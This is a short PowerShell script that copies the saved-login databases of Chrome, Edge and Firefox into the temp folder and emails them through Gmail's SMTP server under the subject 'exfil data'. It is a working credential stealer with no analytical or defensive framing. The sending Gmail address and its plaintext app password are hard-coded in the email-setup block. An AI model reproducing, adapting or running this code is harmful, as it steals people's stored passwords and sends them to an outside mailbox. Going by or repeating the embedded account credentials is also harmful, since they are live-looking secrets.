# Copy browser login files if they exist
$chromeSrc = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$chromeDst = "$env:TEMP\chrome_login_data.db"
if (Test-Path $chromeSrc) {
    Copy-Item $chromeSrc $chromeDst -ErrorAction SilentlyContinue -Force
}

$edgeSrc = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$edgeDst = "$env:TEMP\edge_login_data.db"
if (Test-Path $edgeSrc) {
    Copy-Item $edgeSrc $edgeDst -ErrorAction SilentlyContinue -Force
}

$firefoxProfileRoot = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $firefoxProfileRoot) {
    $firefoxProfile = Get-ChildItem $firefoxProfileRoot | Where-Object { $_.PSIsContainer } | Select-Object -First 1
    if ($firefoxProfile) {
        $firefoxLoginsSrc = Join-Path $firefoxProfile.FullName "logins.json"
        $firefoxLoginsDst = "$env:TEMP\firefox_logins.json"
        if (Test-Path $firefoxLoginsSrc) {
            Copy-Item $firefoxLoginsSrc $firefoxLoginsDst -ErrorAction SilentlyContinue -Force
        }
    }
}

# Email setup
$smtpServer = "smtp.gmail.com"
$smtpPort = 587
$from = "zubaidyomar@gmail.com"
$to = "temdawd2@gmail.com"
$subject = "exfil data"
$body = "just all the stuff"
$username = "zubaidyomar@gmail.com"
$password = "tgcwsfoamkossqej"

# Create credential object
$secpasswd = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ($username, $secpasswd)

# Collect attachments
$attachments = @()
if (Test-Path $chromeDst) { $attachments += $chromeDst }
if (Test-Path $edgeDst) { $attachments += $edgeDst }
if ($firefoxLoginsDst -and (Test-Path $firefoxLoginsDst)) { $attachments += $firefoxLoginsDst }

# Send email with attachments
Send-MailMessage -From $from -To $to -Subject $subject -Body $body -SmtpServer $smtpServer -Port $smtpPort -UseSsl -Credential $cred -Attachments $attachments
